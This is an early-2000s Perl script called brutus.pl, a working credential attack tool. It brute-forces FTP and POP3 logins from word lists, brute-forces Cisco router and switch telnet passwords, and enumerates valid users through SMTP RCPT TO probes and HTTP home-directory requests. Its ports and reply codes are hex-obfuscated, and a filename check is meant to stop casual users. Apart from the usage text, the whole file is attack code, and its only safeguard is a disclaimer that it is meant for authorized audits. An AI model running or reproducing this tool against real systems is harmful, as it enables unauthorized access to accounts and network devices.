#!/usr/bin/perl
###############################################################################
# Autor         :       Nelson Brito
# Email         :       nelson@SECUNET.COM.BR
# Data          :       Rio de Janeiro, 13 de Agosto de 2000
# Publicado     :       Rio de Janeiro, 12 de Fevereiro de 2001
# Versão        :       1.8 Hacked Release - English Version
# BOS-Br's Code :       stderr-03-2001
###############################################################################
use strict;
use Socket;
use Getopt::Std;
require 5.00503;
#
# This program was tested in folowing plataforms: Linux, Solaris, OpenBSD,
# FresBSD, NetBSD, SCO and Windows NT/9X/2000(Active Perl).
#
# Sorry, but, unfortunately, the ChangeLog was not translated.
#
# ChangeLog:
#	6) $Id: brutus.pl,v 1.8 Hacked Release 2000/11/02 11:39:37 stderr Exp $:
#	-> Incluída a opção T5, para ataque de Força Bruta em Roteadores e Switchs
#	   Cisco.
#	-> Incluída a opção de alerta sonoro, para senhas encontradas através de
#	   Força Bruta ou usuários encontrados através de Enumeração.
#
#	5) $Id: brutus.pl,v 1.6 2000/09/14 10:39:37 stderr Exp $:
#	-> Incluída a opção T4, para enumeração de usuários através de HTTP.
#
#	4) $Id: brutus.pl,v 1.0.2 2000/08/21 16:30:37 stderr Exp $:
#	-> Incluída a técnica que permite Enumeração de usuário por SMPT através
#	   de Mail Hubs(user%VICTIM-DOMAIN.COMat_private).
#	-> Incluído tempo de espera($opt{'t'}), buscando evitar a paralização do
#	   serviço FTP temporariamente quando muitas requisições são feitas.
#
#	3) $Id: brutus.pl,v 0.88 2000/08/15 10:07:10 stderr Exp $:
#	-> "Code Hacking" para funcionar em plataformas Windows NT/9X/2000.
#
#	2) $Id: brutus.pl,v 0.69 2000/08/14 10:29:40 stderr Exp $:
#	-> Corrigido o BUG do salvamento em arquivo.
#	-> Corrigido o BUG de Força Bruta(usuário+senha).
#	-> Retirada da variável $server na função "scanuser", buscando um
#	   "bypass" de Anti-Relay.
#
#	1) $Id: brutus.pl,v 0.22 2000/08/13 14:49:38 stderr Exp $:
#	-> Primeira versão criada, com:
#	   a) Técnica de Força Bruta para POP3 e FTP;
#	   b) Técnica de Enumeração de usuários através de SMTP, assim como
#	      o "SMTP-Cracker.c".
#	   c) Obscuridade do código tentando tornar impraticável a utilização
#	      deste script por "script kiddies".
#	
my %opt; getopts("h:u:p:e:o:t:T:V:Av", \%opt); my $ver = "1.8-HR_English";

if($^O=~/MSWin32/i){ my @mistake = split(/\\/, $0); $0 = pop @mistake; }
else{ $0=~s#.*/##; }

select(STDOUT); $|=1;
print "--- $0 v. $ver / Nelson Brito / IBQN / Secunet AG ---\n";

usage($0) if (not($opt{'T'}) and not($opt{'h'}));
usage($0) if (not($opt{'T'}) and    ($opt{'h'}));
usage($0) if (   ($opt{'T'}) and not($opt{'h'}));

my @code		= 	("\x32\x33\x30" ,
				 "\x5C\x2B\x4F\x4B" ,
				 "\x32\x35\x30",
				 "\x32\x30\x30\x20\x4F\x4B",
				 "\x50\x61\x73\x73\x77\x6F\x72\x64\x3A");
my @port		=	("\x32\x31",
				 "\x31\x31\x30",
				 "\x32\x35",
				 "\x38\x30",
				 "\x32\x33");

my $revert		=	"\x66\x62\x72\x2B\x76\x53\x4A\x61\x4A\x66\x24\x54\x36";
my $verbose		= 	1 ? $opt{'v'} : 0;
my $beep		=	1 ? $opt{'A'} : 0;
my $user_found	=	0;
my $found		=	0;

if(defined $opt{'h'}){
	exit(0) if (not(permut($0)));
	if(defined $opt{'T'}){
		my $technique = $opt{'T'};
		if($technique eq "1"){
			(($opt{'u'}) and ($opt{'p'}) and ($opt{'o'})) or usage($0);
			bpair($opt{'h'}, $opt{'u'}, $opt{'p'}, $opt{'o'}, $port[0], $code[0]);
		}elsif($technique eq "2"){
			(($opt{'u'}) and ($opt{'p'}) and ($opt{'o'})) or usage($0);
			bpair($opt{'h'}, $opt{'u'}, $opt{'p'}, $opt{'o'}, $port[1], $code[1]);
		}elsif($technique eq "3"){
			(($opt{'e'}) and ($opt{'o'})) or usage($0);
			buser($opt{'h'}, $opt{'e'}, $opt{'o'}, $port[2], $code[2], 0);
		}elsif($technique eq "4"){
			(($opt{'e'}) and ($opt{'o'})) or usage($0);
			buser($opt{'h'}, $opt{'e'}, $opt{'o'}, $port[3], $code[3], 1);
		}elsif($technique eq "5"){
			(($opt{'p'}) and ($opt{'o'})) or usage($0);
			bcisco($opt{'h'}, $opt{'p'}, $opt{'o'}, $port[4], $code[4]);
		}else{ die "getopts(): unknow technique\n"; }
	}
}	

sub usage{
die <<USAGE

Use:     $_[0] (Options) (Techniques)
Example: $_[0] -h pop.victim.org -u users -p passwords -o result -t 3 -v -A -T2

Options:
     -h  [host]     Machine's name for test.                          (A)
     -o  [file]     File to dump the results.                         (A)
     -u  [file]     File with valid user names.                       (B)
     -p  [file]     File with passwords for test.                     (B)
     -e  [file]     File with possible users to be enumerated.        (C)
     -V  [virtual]  Use \"Mail HUB\" for T3.                            (D)
     -t  [seconds]  Enable \"time wait\" for T1 and T2.                 (E)
     -v             Turn on verbose mode.
     -A             Turn on Beep Alert to \"Success Execution\".

Techniques:
     -T1            Brute Force Technique using FTP.
     -T2            Brute Force Technique using POP3.
     -T3            Users Enumeration Technique using SMTP.           (F)
     -T4            Users Enumeration Technique using HTTP.
     -T5            Brute Force Technique using Cisco's TELNET.       (G)

PS:
     (A) Needed for all Techniques.
     (B) Needed *only* for Techniques 1 and 2.
     (C) Needed *only* for Techniques 3 and 4.
     (D) Can be usefull *only* for Technique 3.
     (E) Can be usefull *only* for Techniques 1, 2 and 5.
     (F) Read more at: http://stderr.sekure.org/texts/ADV-smtp-eng.txt.
     (G) Works against Catalysts and 16XX Series.

Greats:
     Thiago Zaninotti(c0nd0r), Gustavo Scotti(csh), Rafael(netrap), Nilson
     Brito(my brother),  Felipe(falcon),  corb(Manu),   Alexandre Pauferro,  ,
     Mamãe,  Helge Fischer(to support me),  Andréa Goulart and André Silva.

     I would like to thank rfp to open my mind to begin use PERL to code my
     own tools.

     Especial thanks  to SecurityFocus folks to bring us an excelent way to
     search and research vulnerabilities.

Comments:
     This program was developed for  private use  in Remote Password Audit
     and  Penetration  Test,  so  do  not  use for malicious purposes. The
     author do not have any responsability for malicious use of this code!

     Sugestions, comments, flames, send to:
     Nelson Brito<nelson\@SECUNET.COM.BR>.

Copyright © 2000, 2001 Nelson Brito - IBQN / Secunet AG. All rights reserved.
USAGE
;
}

sub bprint{
	return if not($_[2]); select(STDOUT); $|=1;
	my $uguest  = "$_[0]"; my $pguest   = "$_[1]";
	printf("[+] %-25s -> %-25s", $uguest, $pguest);
}

sub sprint{
	return if not($_[1]); select(STDOUT); $|=1;
	my $uguest  = "$_[0]";
	printf("[+] %-25s", $uguest);
}

sub alpha{
	$_ = "$_[0]";
	y/\!\@\#\$\%\^\&\*\(\)\_\+\{\}\|\:\"\<\>\?\-\=\[\]\\\'\;\/\.\,\`\~/\~\`\,\.\/\;\'\\\]\[\=\-\?\>\<\"\:\|\}\{\+\_\)\(\*\&\^\%\$\#\@\!/;
	y/a-z0-9/gvibn9wprud2lmx8z3fa4eq15oy06sjc7kth/;
	y/A-Z0-9/GVIBN9WPRUD2LMX8Z3FA4EQ15OY06SJC7KTH/;
	return $_; }

sub numeric{
	$_ = "$_[0]";
	y/GVIBN9WPRUD2LMX8Z3FA4EQ15OY06SJC7KTH/A-Z0-9/;
	y/gvibn9wprud2lmx8z3fa4eq15oy06sjc7kth/a-z0-9/;
	y/\~\`\,\.\/\;\'\\\]\[\=\-\?\>\<\"\:\|\}\{\+\_\)\(\*\&\^\%\$\#\@\!/\!\@\#\$\%\^\&\*\(\)\_\+\{\}\|\:\"\<\>\?\-\=\[\]\\\'\;\/\.\,\`\~/;
	return $_; }

sub permut{
        my $in = "$_[0]";
        my $aa = numeric($revert); my $cc = numeric(alpha($in));
        my $bb = alpha($in); my $dd = alpha(numeric($revert));
        ($in eq $aa) or return 0; ($in eq $cc) or return 0;
        (($aa eq $cc) and ($bb eq $dd)) or return 0;
        return 1; }

sub bpair{
	my $server = "$_[0]"; my $ulist = "$_[1]";
	my $plist  = "$_[2]"; my $out   = "$_[3]";
	my $sport  = "$_[4]"; my $tcode = "$_[5]";
	my $count  = 0;       my @users;

	open(OUT, ">" . $out) or die "\nopen(): $!\n"; select(OUT); $|=1;
	print OUT "File created by $0 v. $ver, developed by Nelson Brito.\n\n";

	open(USER, $ulist) or die "\nopen(): $!\n";
	until(eof(USER)){
		my $user = <USER>; chomp($user);
		if($user=~/^\s*#/){ next; }
		if($user=~/^\s*$/){ next; }
		push @users, $user;
	}
	close(USER);

LOOP:	while($count < @users){
		open(PASS, $plist) or die "\nopen(): $!\n";
		until(eof(PASS)){
			my $pass = <PASS>; chomp($pass);
			if($pass=~/^\s*#/){ next; }
			if($pass=~/^\s*$/){ next; }
			sleep($opt{'t'}) if ($opt{'t'});
			bprint($users[$count], $pass, $verbose);
			if(sendbrute($users[$count], $pass, $server, $sport, $tcode)){
				select(OUT); $|=1;
				print "LOGIN: $users[$count], PASSWORD: $pass, HOST: $server\n";
				print STDOUT "\tBINGO\n" if ($verbose);
				print STDOUT "\a" if ($beep); $user_found++;
				shift @users; close(PASS); goto LOOP;
			}else{ print STDOUT "\b\r" if ($verbose); }
		}
		shift @users; close(PASS);
	}

	print OUT "\nEnd of tests at $server. Found $user_found passwords.\n"; close(OUT);
	print STDOUT "[+] Check out $out for $server's results!\n";
}

sub buser{
	my $server = "$_[0]"; my $ulist = "$_[1]";
	my $out    = "$_[2]"; my $sport = "$_[3]";
	my $tcode  = "$_[4]"; my $http  = "$_[5]";

	open(OUT, ">" . $out) or die "\nopen(): $!\n";
	print OUT "# File created by $0 v. $ver, developed by Nelson Brito.\n\n";

	open(USER, $ulist) or die "\nopen(): $!\n";
	until(eof(USER)){
		my $user = <USER>; chomp($user);
		if($user=~/^\s*#/){ next; }
		if($user=~/^\s*$/){ next; }
		$user = $user. "%" . "$opt{'V'}" if (($opt{'V'}) and not($http));
		sprint($user, $verbose);
		if(scanuser($user, $server, $sport, $tcode, $http)){
			select(OUT); $|=1;
			print "# User found:\n$user\n";
			print STDOUT "\tBINGO\n" if ($verbose);
			print STDOUT "\a" if ($beep); $user_found++;
		}else{ print STDOUT "\b\r" if ($verbose); }
	}
	close(USER);

	print OUT "\n# End of tests at $server. Found $user_found users.\n"; close(OUT);
	print STDOUT "[+] Check out $out for $server's results!\n";
}

sub sendbrute{
	my $user  = "$_[0]"; my $pass  = "$_[1]"; my $server = "$_[2]";
	my $sport = "$_[3]"; my $tcode = "$_[4]"; my $result = '';

	inet_aton($server) or die "\ninet_aton(): $!\n";
	socket(SECUNET, PF_INET, SOCK_STREAM, getprotobyname("tcp")||0) or die "\nsocket(): $!\n";
	connect(SECUNET, pack "SnA4x8", 2, $sport, inet_aton($server)) or die "\nconnect(): $!\n";
	select(SECUNET); $|=1;            recv(SECUNET, $result, 1024, 0);
	send(SECUNET, "USER $user\n", 0); recv(SECUNET, $result, 1024, 0);
	send(SECUNET, "PASS $pass\n", 0); recv(SECUNET, $result, 1024, 0);
	if($result=~/^$tcode/smi){ close(SECUNET); return 1;
	}else{ close(SECUNET); return 0; }
}

sub scanuser{
	my $user   = "$_[0]"; my $server = "$_[1]";
	my $sport  = "$_[2]"; my $tcode  = "$_[3]";
	my $result = ''; my $http = "$_[4]";
	my $anothercode = "\x34\x30\x33\x20\x46\x6F\x72\x62\x69\x64\x64\x65\x6E" if ($http);

	inet_aton($server) or die "\ninet_aton(): $!\n";
	socket(SECUNET, PF_INET, SOCK_STREAM, getprotobyname("tcp")||0) or die "\nsocket: $!\n";
	connect(SECUNET, pack "SnA4x8", 2, $sport, inet_aton($server)) or die "\nconnect(): $!\n";
	if(not($http)){
		select(SECUNET); $|=1;                             recv(SECUNET, $result, 4096, 0);
		send(SECUNET, "HELO $server\n", 0);                recv(SECUNET,$result, 4096, 0);
		send(SECUNET, "MAIL FROM: <root\@localhost>\n",0); recv(SECUNET, $result, 4096, 0);
		send(SECUNET, "RCPT TO: <$user>\n", 0);            recv(SECUNET, $result, 4096, 0);
		if($result=~/^$tcode/smi){ close(SECUNET); return 1; }
		else{ close(SECUNET); return 0; }
	}else{
		select(SECUNET); $|=1;
		send(SECUNET, "HEAD /~$user/ HTTP/1.0\n\n", 0);
		recv(SECUNET, $result, 1024, 0);
		if(($result=~/$tcode/smi) or ($result=~/$anothercode/smi)){ close(SECUNET); return 1; }
		else{ close(SECUNET); return 0; }
	}	
}

sub bcisco{
	my $server = "$_[0]"; my $passfile = "$_[1]";
	my $out    = "$_[2]"; my $port   = "$_[3]";
	my $code   = "$_[4]"; my $result = '';

	inet_aton($server) or die "inet_aton(): $!\n";

	open(OUT, ">" . $out) or die "\nopen(): $!\n"; select(OUT); $|=1;
	print OUT "File created by $0 v. $ver, developed by Nelson Brito.\n\n";

	open(PASS, $passfile) or die "open(): $!\n";
	until(eof(PASS)){
		sleep($opt{'t'}) if ($opt{'t'});
		my $password = <PASS>; chomp($password);
		if($password=~/^\s*#/){ next; }
		if($password=~/^\s*$/){ next; }

		socket(SECUNET, PF_INET, SOCK_STREAM, getprotobyname("tcp")||0) or
			die "socket(): $!\n";
		connect(SECUNET, pack "SnA4x8", 2, $port, inet_aton($server)) or
			die "connect(): $!\n";

		select(SECUNET); $|=1; recv(SECUNET, $result, 1024, 0); recv(SECUNET, $result, 1024, 0);

		select(SECUNET); $|=1; send(SECUNET, $password . "\n", 0);
		recv(SECUNET, $result, 1024, 0);
		my @results = split(/\s+/, $result);

		sprint($password, $verbose);
		if($results[1]=~/$code/smi){ print STDOUT "\b\r" if ($verbose); close(SECUNET);
		}else{
			select(OUT); $|=1; print STDOUT "BINGO\n";
			print "Password \"$password\" acepted for router \"$server\"!\n";
			print "Router/Switch's prompt is: $results[1]\n\n";
			print "End of tests at $server!\n"; close(OUT);
			print STDOUT "\a" if ($beep);
			print STDOUT "[+] Check out $out for $server's results!\n" if ($verbose);
			close(SECUNET); close(PASS);
			exit;  }
	}
	close(PASS); close(OUT);
}
#
# Copyright © 2000, 2001 Nelson Brito - IBQN / Secunet AG. All rights reserved.
#
# This code may be freely distributed and modified, so long as credit
# to the original author, Nelson Brito, is left in tact.
#
# The end!
#
